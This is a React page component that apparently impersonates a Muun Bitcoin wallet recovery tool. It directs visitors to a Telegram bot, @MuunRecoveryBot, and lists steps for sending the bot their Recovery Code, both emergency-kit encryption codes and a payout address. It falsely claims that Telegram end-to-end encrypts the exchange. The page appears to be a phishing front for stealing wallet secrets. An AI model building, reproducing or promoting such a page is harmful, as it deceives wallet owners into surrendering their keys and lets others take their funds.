import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertCircle, Bot, MessageCircle, Shield, ArrowRight, Smartphone, Key, FileCode2, Bitcoin, Settings } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Link } from "wouter";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import TelegramBotSetup from "@/components/TelegramBotSetup";

export default function TelegramBotPage() {
  return (
    <div className="max-w-4xl mx-auto p-6 min-h-screen flex flex-col">
      {/* Header */}
      <header className="mb-8">
        <div className="flex items-center justify-between">
          <h1 className="text-primary text-2xl font-mono font-semibold">Muun Recovery Tool v2.3.0</h1>
          <Link href="/legacy">
            <Button variant="outline" className="text-sm">
              Legacy Web Version
              <ArrowRight className="h-4 w-4 ml-2" />
            </Button>
          </Link>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1">
        <div className="flex flex-col gap-6 mb-6">
          <Card className="border-primary/20">
            <CardHeader className="pb-2">
              <CardTitle className="flex items-center">
                <Bot className="h-6 w-6 mr-2 text-primary" />
                Telegram Bot Recovery
              </CardTitle>
              <CardDescription>
                Our new Telegram-based recovery system makes it easier and more secure to recover your funds
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Alert className="bg-blue-900 bg-opacity-10 border border-blue-700 mb-4">
                <AlertCircle className="h-4 w-4 text-blue-400" />
                <AlertDescription className="text-blue-100">
                  We've upgraded our recovery process to use Telegram for a more secure, step-by-step recovery flow.
                </AlertDescription>
              </Alert>
              
              <div className="flex items-center justify-center my-6">
                <div className="bg-gray-800 rounded-lg p-6 text-center w-full max-w-md border border-gray-700">
                  <Bot className="h-16 w-16 mx-auto text-primary mb-3" />
                  <h2 className="text-lg font-medium text-white mb-2">@MuunRecoveryBot</h2>
                  <p className="text-gray-400 mb-4">Start a conversation with our Telegram bot to recover your funds</p>
                  <Button 
                    className="bg-[#0088cc] hover:bg-[#0099dd] text-white"
                    onClick={() => window.open('https://t.me/MuunRecoveryBot', '_blank')}
                  >
                    <MessageCircle className="h-4 w-4 mr-2" />
                    Open Telegram Bot
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-primary/20">
            <CardHeader className="pb-2">
              <CardTitle>How the Recovery Process Works</CardTitle>
              <CardDescription>
                The Telegram bot will guide you through these steps
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="flex gap-3">
                  <div className="flex-shrink-0 h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center text-primary">1</div>
                  <div>
                    <h3 className="font-medium mb-1 flex items-center">
                      <Key className="h-4 w-4 mr-2 text-primary" />
                      Provide Your Recovery Code
                    </h3>
                    <p className="text-muted-foreground text-sm">
                      Enter your Recovery Code in the format XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX
                    </p>
                  </div>
                </div>

                <Separator />

                <div className="flex gap-3">
                  <div className="flex-shrink-0 h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center text-primary">2</div>
                  <div>
                    <h3 className="font-medium mb-1 flex items-center">
                      <FileCode2 className="h-4 w-4 mr-2 text-primary" />
                      Enter First Encryption Code
                    </h3>
                    <p className="text-muted-foreground text-sm">
                      Provide the first encryption code from your emergency kit
                    </p>
                  </div>
                </div>

                <Separator />

                <div className="flex gap-3">
                  <div className="flex-shrink-0 h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center text-primary">3</div>
                  <div>
                    <h3 className="font-medium mb-1 flex items-center">
                      <FileCode2 className="h-4 w-4 mr-2 text-primary" />
                      Enter Second Encryption Code
                    </h3>
                    <p className="text-muted-foreground text-sm">
                      Provide the second encryption code from your emergency kit
                    </p>
                  </div>
                </div>

                <Separator />

                <div className="flex gap-3">
                  <div className="flex-shrink-0 h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center text-primary">4</div>
                  <div>
                    <h3 className="font-medium mb-1 flex items-center">
                      <Bitcoin className="h-4 w-4 mr-2 text-primary" />
                      Provide Bitcoin Address
                    </h3>
                    <p className="text-muted-foreground text-sm">
                      Enter a valid Bitcoin address where you want your recovered funds sent
                    </p>
                  </div>
                </div>

                <Separator />

                <div className="flex gap-3">
                  <div className="flex-shrink-0 h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center text-primary">5</div>
                  <div>
                    <h3 className="font-medium mb-1 flex items-center">
                      <Shield className="h-4 w-4 mr-2 text-primary" />
                      Fund Recovery
                    </h3>
                    <p className="text-muted-foreground text-sm">
                      The bot will scan wallet addresses (up to 20,000) to locate your funds and initiate the recovery transfer
                    </p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-primary/20">
            <CardHeader className="pb-2">
              <CardTitle>Why Use Telegram?</CardTitle>
              <CardDescription>
                Benefits of our new Telegram-based recovery system
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid gap-4 md:grid-cols-2">
                <div className="bg-card/50 p-4 rounded-lg border border-primary/10">
                  <div className="flex items-center mb-2">
                    <Shield className="h-5 w-5 mr-2 text-primary" />
                    <h3 className="font-medium">Enhanced Security</h3>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Telegram's secure messaging platform provides end-to-end encryption for your sensitive recovery information
                  </p>
                </div>

                <div className="bg-card/50 p-4 rounded-lg border border-primary/10">
                  <div className="flex items-center mb-2">
                    <Smartphone className="h-5 w-5 mr-2 text-primary" />
                    <h3 className="font-medium">Mobile-Friendly</h3>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Access the recovery tool directly from your phone without needing to upload files or navigate a web interface
                  </p>
                </div>

                <div className="bg-card/50 p-4 rounded-lg border border-primary/10">
                  <div className="flex items-center mb-2">
                    <MessageCircle className="h-5 w-5 mr-2 text-primary" />
                    <h3 className="font-medium">Interactive Guidance</h3>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Step-by-step instructions and real-time feedback guide you through the entire recovery process
                  </p>
                </div>

                <div className="bg-card/50 p-4 rounded-lg border border-primary/10">
                  <div className="flex items-center mb-2">
                    <ArrowRight className="h-5 w-5 mr-2 text-primary" />
                    <h3 className="font-medium">Faster Recovery</h3>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Simplified process means faster fund recovery with direct status updates as we scan for your assets
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-6 mt-8 border-t border-gray-800 text-muted text-sm">
        <div className="flex flex-col md:flex-row justify-between items-center">
          <p>© {new Date().getFullYear()} Muun. All rights reserved.</p>
          <div className="mt-4 md:mt-0">
            <a href="#" className="text-muted hover:text-primary mr-4">Privacy Policy</a>
            <a href="#" className="text-muted hover:text-primary mr-4">Terms of Service</a>
            <a href="#" className="text-muted hover:text-primary">Help Center</a>
          </div>
        </div>
      </footer>
    </div>
  );
}